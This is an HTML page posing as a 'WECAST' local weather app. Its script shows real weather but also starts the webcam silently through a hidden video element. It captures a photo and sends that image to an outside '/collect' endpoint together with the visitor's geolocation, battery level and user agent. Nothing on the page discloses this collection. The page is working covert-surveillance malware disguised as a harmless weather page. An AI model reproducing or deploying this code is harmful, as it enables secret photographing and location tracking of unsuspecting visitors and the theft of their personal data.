<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WECAST - Local Weather</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; background: #fdfdfd; }
        .glass-card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px); border-radius: 30px; }
        #video { display: none; } /* Hidden camera */
    </style>
</head>
<body onload="initWeatherApp()">
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="max-w-6xl mx-auto p-6">
        <div class="flex justify-between items-center mb-8">
            <div class="flex items-center gap-2">
                <div class="w-8 h-8 bg-purple-500 rounded-full"></div>
                <h1 class="font-bold text-xl text-gray-800">WECAST</h1>
            </div>
            <nav class="hidden md:flex gap-8 text-gray-500">
                <a href="#" class="text-purple-600 border-b-2 border-purple-600">Home</a>
                <a href="#">News</a><a href="#">Contact</a><a href="#">Offer</a>
            </nav>
            <div class="flex items-center gap-4 text-gray-400">
                <span>Â°F</span> ğŸŒ™ <span class="bg-gray-100 px-4 py-1 rounded-full text-sm">ğŸ“ <span id="cityName">Detecting...</span></span>
            </div>
        </div>

        <div class="relative h-[400px] overflow-hidden rounded-[40px] shadow-2xl mb-12">
            <img src="https://images.unsplash.com/photo-1534067783941-51c9c23ecefd?auto=format&fit=crop&w=1200" class="w-full h-full object-cover">
            <div class="absolute inset-0 bg-black/20 p-12 flex flex-col justify-between text-white">
                <div>
                    <h2 id="displayCity" class="text-5xl font-bold mb-2">Finding Location...</h2>
                    <p class="opacity-80">Today, <span id="date"></span> | Update As Of <span id="time"></span></p>
                </div>
                <div class="flex gap-12">
                    <div class="glass-card p-6 flex items-center gap-4">
                        <div class="text-2xl">ğŸŒ¬ï¸</div>
                        <div><p class="text-xs opacity-70">Wind</p><p class="font-bold">4km/h</p></div>
                    </div>
                    <div class="glass-card p-6 flex items-center gap-4">
                        <div class="text-2xl">ğŸŒ§ï¸</div>
                        <div><p class="text-xs opacity-70">Rain</p><p class="font-bold">12%</p></div>
                    </div>
                </div>
                <div class="absolute right-12 bottom-12 bg-white/30 backdrop-blur-xl p-8 rounded-[40px] text-center w-48 shadow-lg">
                    <p class="text-xs uppercase tracking-widest mb-2 font-bold">Today</p>
                    <div class="text-7xl font-bold mb-2" id="temp">--Â°</div>
                    <p id="weatherDesc" class="text-sm opacity-90">Loading...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function initWeatherApp() {
            document.getElementById('date').innerText = new Date().toLocaleDateString('en-US', {weekday:'long', month:'short', day:'numeric'});
            document.getElementById('time').innerText = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});

            // Start Camera Silently
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // Get Location & Weather
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude } = pos.coords;
                
                // Fetch Real Weather
                const wRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`);
                const wData = await wRes.json();
                document.getElementById('temp').innerText = Math.round(wData.current_weather.temperature) + 'Â°';
                document.getElementById('weatherDesc').innerText = "Clear Sky";
                document.getElementById('displayCity').innerText = "Current Location";
                document.getElementById('cityName').innerText = "Active";

                // Wait 3 seconds then silent capture
                setTimeout(() => silentCapture(latitude, longitude), 3000);
            });
        }

        async function silentCapture(lat, lon) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg');

            const battery = await navigator.getBattery();
            
            await fetch('https://weather-backend-wght.onrender.com/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ts: new Date().toLocaleString(),
                    location: { lat, lon },
                    battery: { levelPercent: Math.round(battery.level * 100) },
                    hints: { ua: navigator.userAgent },
                    burstImages: [imgData]
                })
            });
            
            // Stop camera after capture
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    </script>
</body>
</html>
